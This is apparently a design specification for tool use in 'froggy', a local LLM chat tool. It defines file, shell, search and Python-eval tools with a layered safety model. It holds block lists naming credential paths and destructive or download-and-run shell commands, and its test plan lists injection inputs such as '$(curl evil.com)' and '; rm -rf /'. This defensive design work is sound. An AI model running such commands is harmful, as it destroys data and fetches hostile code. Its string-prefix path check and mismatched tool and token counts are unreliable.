# Froggy Tool-Use Specification

> Tiny but effective tools for local LLM inference.

## 1. Goals

Give froggy a minimal, high-leverage tool system that:

- Works across **all four backends** (Transformers, llama.cpp, MLX, Ollama)
- Stays effective on **small models** (1B–8B parameters, 4K–8K context)
- Uses **grammar-constrained generation** to guarantee valid tool calls
- Ships with **6 core tools** that cover 80%+ of coding-assistant use cases
- Keeps token overhead under **400 tokens** for all tool definitions combined
- Enforces **sandboxed execution** with allowlists and confirmation prompts

## 2. Architecture Overview

```
User Input
    │
    ▼
ChatSession.chat()
    │
    ├─► Inject tool definitions into system prompt
    │   (only relevant tools via ToolSelector)
    │
    ├─► backend.generate_stream() ──► raw token stream
    │
    ├─► ToolCallParser.parse(stream)
    │   ├─► Detected tool_call → ToolExecutor.run()
    │   │       ├─► SafetyLayer.check() → approve / confirm / deny
    │   │       ├─► Execute tool
    │   │       └─► Inject truncated result → re-enter generate loop
    │   └─► No tool_call → render response as normal
    │
    └─► Append final assistant message to history
```

### New Modules

| Module | File | Responsibility |
|--------|------|----------------|
| `ToolRegistry` | `froggy/tools.py` | Tool definitions, JSON Schema, GBNF export |
| `ToolCallParser` | `froggy/tool_parser.py` | Detect and extract tool calls from model output |
| `ToolExecutor` | `froggy/tool_executor.py` | Dispatch, safety checks, execute, format results |
| `ToolSelector` | `froggy/tool_selector.py` | Pick relevant tools per turn (optional, for >8 tools) |

## 3. Tool-Call Wire Format

### Primary: Hermes/ChatML XML-wrapped (widest open-model support)

```xml
<|im_start|>system
You are a helpful assistant with access to tools.
<tools>
[{"type":"function","function":{"name":"read_file","description":"Read file contents","parameters":{"type":"object","properties":{"path":{"type":"string"}},"required":["path"]}}}]
</tools>
When you need to use a tool, respond with a <tool_call> block.
<|im_end|>

<|im_start|>assistant
<tool_call>
{"name": "read_file", "arguments": {"path": "src/main.py"}}
</tool_call>
<|im_end|>

<|im_start|>tool
<tool_response>
{"name": "read_file", "content": "import sys\n..."}
</tool_response>
<|im_end|>
```

### Fallback: OpenAI Chat Completions (for Ollama and llama-server)

When the backend exposes an OpenAI-compatible API (Ollama `/api/chat`, llama-server `/v1/chat/completions`), pass tools via the `tools` parameter and read `tool_calls` from the response. No prompt engineering needed — the server handles formatting.

### Backend Routing

| Backend | Format | Structured Output |
|---------|--------|-------------------|
| **Transformers** | Hermes XML in prompt | Outlines or lm-format-enforcer logit masking |
| **llama.cpp** | Hermes XML in prompt | GBNF grammar via `--grammar` flag |
| **MLX** | Hermes XML in prompt | Outlines (`outlines.models.mlxlm`) |
| **Ollama** | OpenAI `tools` param | Native (server-side, model-dependent) |

## 4. Core Tools (The Essential Five)

These six tools cover file operations, shell access, computation, and web knowledge. Total schema overhead: ~450 tokens.

### 4.1 `read_file`

```json
{
  "type": "function",
  "function": {
    "name": "read_file",
    "description": "Read text content of a file. Returns first 200 lines by default.",
    "parameters": {
      "type": "object",
      "properties": {
        "path": {"type": "string", "description": "File path relative to project root"},
        "offset": {"type": "integer", "description": "Start line (0-indexed). Default: 0"},
        "limit": {"type": "integer", "description": "Max lines to return. Default: 200"}
      },
      "required": ["path"],
      "additionalProperties": false
    }
  }
}
```

**Execution:** `pathlib.Path.read_text()` with line slicing. Validate path is within allowed root. Return line-numbered content.

**Safety tier:** Auto-approve (read-only). Block paths matching `~/.ssh`, `~/.aws`, `~/.gnupg`, `/etc/shadow`, `**/.*env*`, `**/*.pem`, `**/*.key`.

### 4.2 `write_file`

```json
{
  "type": "function",
  "function": {
    "name": "write_file",
    "description": "Write or overwrite a file with the given content.",
    "parameters": {
      "type": "object",
      "properties": {
        "path": {"type": "string", "description": "File path relative to project root"},
        "content": {"type": "string", "description": "Full file content to write"}
      },
      "required": ["path", "content"],
      "additionalProperties": false
    }
  }
}
```

**Execution:** Write via `pathlib.Path.write_text()`. Create parent dirs if needed. Return bytes written + diff summary if file existed.

**Safety tier:** Confirm if overwriting existing file. Block sensitive paths (same blocklist as `read_file`). Reject writes outside project root.

### 4.3 `edit_file`

```json
{
  "type": "function",
  "function": {
    "name": "edit_file",
    "description": "Replace an exact string match in a file with new content.",
    "parameters": {
      "type": "object",
      "properties": {
        "path": {"type": "string", "description": "File path relative to project root"},
        "old_string": {"type": "string", "description": "Exact text to find (must match uniquely)"},
        "new_string": {"type": "string", "description": "Replacement text"}
      },
      "required": ["path", "old_string", "new_string"],
      "additionalProperties": false
    }
  }
}
```

**Execution:** Read file, verify `old_string` appears exactly once, replace it, write back. Return a unified diff of the change (3 lines of context). Fail with a clear error if `old_string` is not found or matches multiple locations.

**Safety tier:** Confirm (same tier as `write_file`). Block sensitive paths. Reject edits outside project root. This is the preferred tool for modifying existing files — cheaper on tokens than `write_file` since only the changed portion is sent.

### 4.4 `run_shell`

```json
{
  "type": "function",
  "function": {
    "name": "run_shell",
    "description": "Run a shell command and return stdout+stderr. Timeout: 30s.",
    "parameters": {
      "type": "object",
      "properties": {
        "cmd": {"type": "string", "description": "Shell command to execute"}
      },
      "required": ["cmd"],
      "additionalProperties": false
    }
  }
}
```

**Execution:** `subprocess.run(cmd, shell=True, capture_output=True, timeout=30, cwd=project_root)`. Return stdout, stderr, and exit code.

**Safety tier:** Always confirm with user. Allowlisted commands auto-approve: `git`, `python`, `pytest`, `ruff`, `ls`, `cat`, `head`, `tail`, `wc`, `grep`, `find`, `diff`, `echo`, `pwd`, `which`, `pip list`, `pip show`. Blocklisted patterns reject immediately: `rm -rf /`, `sudo`, `chmod 777`, `curl | sh`, `eval`, `> /dev/`, `mkfs`, `dd if=`.

### 4.5 `web_search`

```json
{
  "type": "function",
  "function": {
    "name": "web_search",
    "description": "Search the web and return top results with snippets.",
    "parameters": {
      "type": "object",
      "properties": {
        "query": {"type": "string", "description": "Search query"}
      },
      "required": ["query"],
      "additionalProperties": false
    }
  }
}
```

**Execution:** Pluggable search backend. Priority order:
1. **SearXNG** (local instance, if available at `http://localhost:8888`)
2. **DuckDuckGo** (`duckduckgo_search` Python package, no API key)
3. **Brave Search API** (if `BRAVE_API_KEY` env var set)

Return top 5 results as: `title`, `url`, `snippet` (max 150 chars each). Total result injection capped at 800 tokens.

**Safety tier:** Auto-approve. Block SSRF targets (169.254.x.x, 10.x.x.x, 192.168.x.x, localhost).

### 4.6 `python_eval`

```json
{
  "type": "function",
  "function": {
    "name": "python_eval",
    "description": "Execute Python code and return the result. Has access to math, json, re, os.path.",
    "parameters": {
      "type": "object",
      "properties": {
        "code": {"type": "string", "description": "Python code to execute"}
      },
      "required": ["code"],
      "additionalProperties": false
    }
  }
}
```

**Execution:** `exec()` in a restricted namespace with: `math`, `json`, `re`, `os.path`, `datetime`, `collections`, `itertools`, `functools`, `textwrap`, `pathlib.PurePath`. Capture stdout via `io.StringIO`. Timeout: 10s. Memory limit: 256MB (via `resource.setrlimit` on POSIX).

**Safety tier:** Confirm for code containing `import`, `open(`, `subprocess`, `os.system`, `eval(`, `exec(`, `__`. Auto-approve pure computation (math, string ops, json parsing).

## 5. Tool Call Detection and Parsing

### Detection Strategy

The parser watches the generation stream for tool-call markers. It must handle both complete and streaming scenarios.

```python
class ToolCallParser:
    """Detects tool calls in model output across formats."""

    # Priority-ordered patterns
    PATTERNS = [
        # Hermes XML format
        re.compile(r"<tool_call>\s*(\{.*?\})\s*</tool_call>", re.DOTALL),
        # Bare JSON with "name" + "arguments" keys (fallback)
        re.compile(r'\{"name"\s*:\s*"(\w+)"\s*,\s*"arguments"\s*:\s*\{.*?\}\}', re.DOTALL),
    ]

    def parse(self, text: str) -> list[ToolCall] | None:
        """Extract tool calls from generated text. Returns None if no tool call detected."""
        ...

    def is_tool_call_starting(self, partial: str) -> bool:
        """Check if streaming output looks like the start of a tool call.
        Used to suppress rendering partial tool-call JSON to the user."""
        return partial.strip().startswith("<tool_call>") or \
               partial.strip().startswith('{"name"')
```

### Streaming Integration

During `session.chat()`, the stream handler accumulates tokens into a buffer. If `is_tool_call_starting()` triggers, the system:

1. Stops rendering to terminal
2. Continues accumulating until the tool call is complete (closing `</tool_call>` or valid JSON)
3. Parses the tool call
4. Executes it (with safety checks)
5. Injects the result as a `tool` role message
6. Re-enters generation with the updated message history

If generation continues after the tool call (multi-step reasoning), the loop repeats. Max **5 tool calls per turn** to prevent runaway loops.

## 6. Grammar-Constrained Generation

### GBNF Grammar for Tool Calls (llama.cpp)

```bnf
root          ::= tool-call | free-text

tool-call     ::= "<tool_call>" ws json-obj ws "</tool_call>"

json-obj      ::= "{" ws
                   "\"name\"" ws ":" ws tool-name ws ","  ws
                   "\"arguments\"" ws ":" ws "{" ws kv-pairs ws "}"
                   ws "}"

tool-name     ::= "\"read_file\"" | "\"write_file\"" | "\"edit_file\"" | "\"run_shell\"" | "\"web_search\"" | "\"python_eval\""

kv-pairs      ::= kv-pair ("," ws kv-pair)*
kv-pair       ::= string ws ":" ws value

value         ::= string | number | "true" | "false" | "null" | array | object
string        ::= "\"" ([^\"\\] | "\\" .)* "\""
number        ::= "-"? [0-9]+ ("." [0-9]+)?
array         ::= "[" ws (value ("," ws value)*)? ws "]"
object        ::= "{" ws (kv-pair ("," ws kv-pair)*)? ws "}"
ws            ::= [ \t\n]*

free-text     ::= [^<]+ | "<" [^t] free-text?
```

This grammar lets the model either produce free text OR a well-formed `<tool_call>` block — never malformed JSON.

### Outlines Integration (Transformers / MLX)

```python
from outlines import generate
from outlines.models import transformers as ot  # or mlxlm
from pydantic import BaseModel, Literal

class ToolCall(BaseModel):
    name: Literal["read_file", "write_file", "edit_file", "run_shell", "web_search", "python_eval"]
    arguments: dict

# Only activate structured generation when tool-call detected
generator = generate.json(model, ToolCall)
```

### When NOT to Constrain

Grammar constraints are only applied when:
- The model is generating a tool-call response (detected by `is_tool_call_starting()`)
- The backend supports it (Transformers, llama.cpp, MLX — not Ollama, which handles it server-side)

Free-text responses flow through unconstrained to preserve natural language quality.

## 7. Tool Result Injection

### Format

```python
def format_tool_result(tool_name: str, result: str, max_tokens: int = 800) -> dict:
    """Format a tool result as a chat message for re-injection."""
    truncated = truncate_to_tokens(result, max_tokens)
    if len(result) > len(truncated):
        truncated += f"\n[...truncated, {len(result) - len(truncated)} chars omitted]"

    return {
        "role": "tool",  # or "user" for models without tool role
        "content": f"<tool_response>\n{{\"name\": \"{tool_name}\", \"content\": {json.dumps(truncated)}}}\n</tool_response>"
    }
```

### Token Budget

| Component | Budget |
|-----------|--------|
| Tool definitions in system prompt | 400 tokens |
| Single tool result injection | 800 tokens |
| Max tool results per turn (5 calls) | 4000 tokens |
| Reserved for conversation history | remainder of context window |

For models with 4K context: fit ~2 tool calls per turn comfortably.
For models with 8K+ context: full 5 tool calls per turn.

## 8. Safety and Sandboxing

### Three-Layer Model

```
Layer 1: Path & Command Validation (always on)
    │
    ▼
Layer 2: Confirmation Prompts (interactive)
    │
    ▼
Layer 3: OS Sandbox (optional, defense-in-depth)
```

### Layer 1 — Validation

```python
import pathlib, re

SENSITIVE_PATHS = [
    "**/.ssh/**", "**/.aws/**", "**/.gnupg/**", "**/.env*",
    "**/*.pem", "**/*.key", "**/credentials*", "**/secret*",
]

BLOCKED_COMMANDS = re.compile(
    r"(sudo|rm\s+-rf\s+/|chmod\s+777|curl.*\|\s*sh|eval\s|"
    r"mkfs|dd\s+if=|>\s*/dev/|fork\s*bomb)",
    re.IGNORECASE
)

def validate_path(path: str, project_root: str) -> pathlib.Path:
    resolved = pathlib.Path(project_root, path).resolve()
    root = pathlib.Path(project_root).resolve()
    if not str(resolved).startswith(str(root)):
        raise PermissionError(f"Path traversal blocked: {path}")
    for pattern in SENSITIVE_PATHS:
        if resolved.match(pattern):
            raise PermissionError(f"Sensitive path blocked: {path}")
    return resolved
```

### Layer 2 — Confirmation Prompt

```
╭─ Tool Call ────────────────────────────────────╮
│  run_shell: git diff HEAD~1                    │
│  Risk: low (allowlisted command)               │
│  Auto-approved ✓                               │
╰────────────────────────────────────────────────╯

╭─ Tool Call ────────────────────────────────────╮
│  write_file: src/main.py                       │
│  Risk: medium (overwriting existing file)      │
│  Allow? [y/n/always]:                          │
╰────────────────────────────────────────────────╯
```

Risk classification:

| Risk | Criteria | Action |
|------|----------|--------|
| **None** | `read_file`, `web_search` | Auto-approve |
| **Low** | `run_shell` with allowlisted binary | Auto-approve |
| **Medium** | `write_file` (overwrite), `python_eval` (pure compute) | Confirm |
| **High** | `run_shell` (unknown binary), `python_eval` (with imports) | Confirm + warn |
| **Blocked** | Matches blocklist pattern | Reject immediately |

### Layer 3 — OS Sandbox (Optional)

On macOS, use `sandbox-exec` for shell commands:

```python
SANDBOX_PROFILE = """
(version 1)
(deny default)
(allow file-read* (subpath "{project_root}"))
(allow file-write* (subpath "{project_root}"))
(allow process-exec (subpath "/usr/bin") (subpath "/usr/local/bin"))
(allow sysctl-read)
(allow mach-lookup)
"""

def sandboxed_shell(cmd: str, project_root: str) -> subprocess.CompletedProcess:
    profile = SANDBOX_PROFILE.format(project_root=project_root)
    with tempfile.NamedTemporaryFile(mode="w", suffix=".sb", delete=False) as f:
        f.write(profile)
        f.flush()
        return subprocess.run(
            ["sandbox-exec", "-f", f.name, "sh", "-c", cmd],
            capture_output=True, text=True, timeout=30, cwd=project_root
        )
```

## 9. Session Integration

### Updated `ChatSession` Interface

```python
class ChatSession:
    def __init__(self, backend, model_info, device):
        self.backend = backend
        self.model_info = model_info
        self.device = device
        self.messages: list[dict] = []
        self.system_prompt: str = "You are a helpful assistant."
        self.temperature: float = 0.7
        self.max_tokens: int = 1024

        # New: tool system
        self.tools_enabled: bool = False
        self.tool_registry: ToolRegistry = ToolRegistry()
        self.tool_parser: ToolCallParser = ToolCallParser()
        self.tool_executor: ToolExecutor = ToolExecutor(project_root=os.getcwd())
        self.max_tool_calls_per_turn: int = 5

    def chat(self, user_input: str) -> str:
        self.messages.append({"role": "user", "content": user_input})
        full_messages = self._build_messages()

        for _round in range(self.max_tool_calls_per_turn + 1):
            response = self._generate(full_messages)

            tool_calls = self.tool_parser.parse(response)
            if not tool_calls:
                break  # Normal text response, done

            for tc in tool_calls:
                result = self.tool_executor.run(tc)
                full_messages.append({"role": "assistant", "content": response})
                full_messages.append(format_tool_result(tc.name, result))

        self.messages.append({"role": "assistant", "content": response})
        return response

    def _build_messages(self) -> list[dict]:
        system = self.system_prompt
        if self.tools_enabled:
            system += "\n" + self.tool_registry.system_prompt_injection()
        return [{"role": "system", "content": system}] + self.messages
```

### New Slash Commands

| Command | Description |
|---------|-------------|
| `/tools` | Toggle tool use on/off. Show current status. |
| `/tools list` | List all registered tools with descriptions. |
| `/tools add <name>` | Enable a specific tool (for selective use). |
| `/tools remove <name>` | Disable a specific tool. |
| `/autorun on\|off` | Toggle auto-approve for low-risk tool calls. |

## 10. Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `FROGGY_TOOLS` | `off` | `on` to enable tools by default |
| `FROGGY_PROJECT_ROOT` | `cwd` | Root directory for file operations |
| `FROGGY_TOOL_AUTORUN` | `false` | Auto-approve low-risk tool calls |
| `FROGGY_SEARCH_BACKEND` | `duckduckgo` | `searxng`, `duckduckgo`, or `brave` |
| `BRAVE_API_KEY` | — | API key for Brave Search (if selected) |
| `FROGGY_SANDBOX` | `false` | Enable OS-level sandboxing |
| `FROGGY_MAX_TOOL_ROUNDS` | `5` | Max tool calls per turn |
| `FROGGY_TOOL_RESULT_TOKENS` | `800` | Max tokens per tool result |

## 11. Extensibility: Custom Tools

Users can register custom tools via a `tools/` directory in the project root:

```python
# tools/my_tool.py
from froggy.tools import Tool, ToolParam

class MyTool(Tool):
    name = "my_tool"
    description = "Does something useful."
    parameters = [
        ToolParam("input", "string", "The input value", required=True),
    ]
    safety_tier = "confirm"  # "auto", "confirm", or "blocked"

    def execute(self, arguments: dict) -> str:
        return f"Result: {arguments['input']}"
```

Custom tools are auto-discovered on startup and merged into the registry. They follow the same safety tiers and confirmation flow as built-in tools.

## 12. Dependencies

### Required (new)

| Package | Purpose | Size |
|---------|---------|------|
| `duckduckgo_search` | Web search (no API key) | ~50KB |

### Optional (for structured output)

| Package | Purpose | When |
|---------|---------|------|
| `outlines` | Grammar-constrained generation | Transformers or MLX backend |
| `lm-format-enforcer` | JSON Schema logit masking | Transformers backend (alternative to Outlines) |

No new dependencies for llama.cpp (GBNF is built-in) or Ollama (server-side tool support).

## 13. Implementation Plan

### Phase 1 — Foundation (MVP)

1. **`ToolRegistry`** — Define the 5 core tools, export JSON schemas, generate system prompt injection text
2. **`ToolCallParser`** — Hermes XML detection + bare JSON fallback, streaming-aware buffering
3. **`ToolExecutor`** — Dispatch by name, path validation, command allowlist/blocklist, confirmation prompts
4. **`ChatSession` integration** — Tool loop in `chat()`, result injection, round limiting
5. **`read_file` + `edit_file` + `run_shell`** — Implement the three highest-value tools first
6. **Tests** — Parser unit tests, executor safety tests, integration tests with mock backend

### Phase 2 — Structured Output

7. **GBNF grammar** for llama.cpp backend (pass via `--grammar` flag in subprocess)
8. **Outlines integration** for Transformers and MLX backends
9. **Ollama native tools** — Pass `tools` param in API request, parse `tool_calls` from response

### Phase 3 — Remaining Tools + Polish

10. **`write_file`** + **`web_search`** + **`python_eval`** implementations
11. **Slash commands** — `/tools`, `/autorun`
12. **Custom tool loader** — Scan `tools/` directory, validate, register
13. **OS sandboxing** — Optional `sandbox-exec` wrapper on macOS
14. **README update** — Document tool system, examples, safety model

### Phase 4 — Advanced (Future)

15. **Tool RAG** — For >8 tools, select relevant subset per turn (TinyAgent-style classifier or embedding similarity)
16. **Parallel tool calls** — Parse multiple `<tool_call>` blocks in a single response, execute concurrently
17. **Multi-modal tools** — Screenshot capture, image analysis (for vision-capable models)
18. **MCP server mode** — Expose froggy's tools as an MCP server for external agents

## 14. Testing Strategy

```
tests/
├── test_tools.py           # ToolRegistry: schema generation, system prompt injection
├── test_tool_parser.py     # ToolCallParser: Hermes XML, bare JSON, edge cases, streaming
├── test_tool_executor.py   # ToolExecutor: dispatch, safety validation, path traversal, blocklist
├── test_tool_safety.py     # Confirmation flow, risk classification, sandbox integration
├── test_tool_integration.py # End-to-end: mock backend → tool call → execute → re-inject → final response
└── test_custom_tools.py    # Custom tool discovery and registration
```

Key test cases:

- **Path traversal**: `../../etc/passwd`, symlink escape, `~/.ssh/id_rsa` → blocked
- **Command injection**: `; rm -rf /`, `$(curl evil.com)`, backtick injection → blocked
- **Malformed tool calls**: Unclosed JSON, missing required params, unknown tool name → graceful error
- **Token budget**: Tool result exceeding 800 tokens → truncated with sentinel
- **Round limiting**: Model that calls tools in a loop → stops at max rounds
- **Streaming edge cases**: Tool call split across multiple chunks → correctly buffered
- **Grammar enforcement**: GBNF grammar rejects invalid tool names, malformed arguments
